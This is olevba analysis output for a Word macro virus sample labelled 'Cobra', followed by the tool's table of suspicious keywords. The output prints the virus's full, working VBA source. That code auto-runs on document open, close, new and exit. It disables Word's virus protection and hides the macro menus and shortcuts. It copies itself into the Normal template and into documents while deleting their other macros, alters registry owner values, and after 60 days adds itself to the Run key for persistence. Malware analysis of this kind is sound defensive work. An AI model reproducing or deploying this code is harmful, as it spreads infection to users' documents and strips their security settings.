olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.l-495654e6c7e56a0a4d5cf236ab47afc2d8d7cf6c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.l-495654e6c7e56a0a4d5cf236ab47afc2d8d7cf6c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO BornCobra.bas 
in file: Virus.MSWord.Cobra.l-495654e6c7e56a0a4d5cf236ab47afc2d8d7cf6c - OLE stream: 'Macros/VBA/BornCobra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Cobra Version 2.0E
'A intelligent member of Cobra family

Sub AutoOpen()
Call IntMenu
Call InfCobra
Call RegE
End Sub
Sub AutoClose()
Call IntMenu
Call InfCobra
Call RegE
End Sub
Sub FileNew()
Call IntMenu
Call InfCobra
Call RegE
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileOpen()
Call IntMenu
Call InfCobra
Call RegE
Dialogs(wdDialogFileOpen).Show
End Sub
Sub FileExit()
On Error Resume Next
Call IntMenu
Call InfCobra
Call RegE
WordBasic.FileExit
End Sub
Sub IntMenu()
On Error Resume Next
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Sub InfCobra()
On Error Resume Next
Dim Mac, MacFound
MacFound = False
For Each Mac In NormalTemplate.VBProject.VBComponents
If Mac.Name <> "ThisDocument" And Mac.Name <> "BornCobra" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=Mac.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each Mac In NormalTemplate.VBProject.VBComponents
If Mac.Name = "BornCobra" Then
MacFound = True
End If
Next
If MacFound = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="BornCobra", _
Object:=wdOrganizerObjectProjectItems
End If
MacFound = False
For Each Mac In ActiveDocument.VBProject.VBComponents
If Mac.Name <> "ThisDocument" And Mac.Name <> "BornCobra" _
And Mac.Name <> "Reference to Normal" Then
Application.OrganizerDelete Source:=ActiveDocument.FullName, _
Name:=Mac.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each Mac In ActiveDocument.VBProject.VBComponents
If Mac.Name = "BornCobra" Then
MacFound = True
End If
Next
If MacFound = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=ActiveDocument.FullName, Name:="BornCobra", _
Object:=wdOrganizerObjectProjectItems
End If
End Sub
Sub RegE()
SR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner")
If SR <> "Cobra" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "349,PB/ER/DHK-1217/BD"
End If
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate")
If Not IsDate(ID) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate") = Format(Date, "mm/dd/yyyy")
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "InfectDate")
End If
CD = Format(Date, "mm/dd/yyyy")
TD = DateValue(CD) - DateValue(ID)
If TD > 60 Then
SysR = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Cobra") = SysR + "\Cobra.Doc"
ActiveDocument.SaveAs (SysR + "\Cobra.Doc"), FileFormat:=wdFormatTemplate
WordBasic.FileExit
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

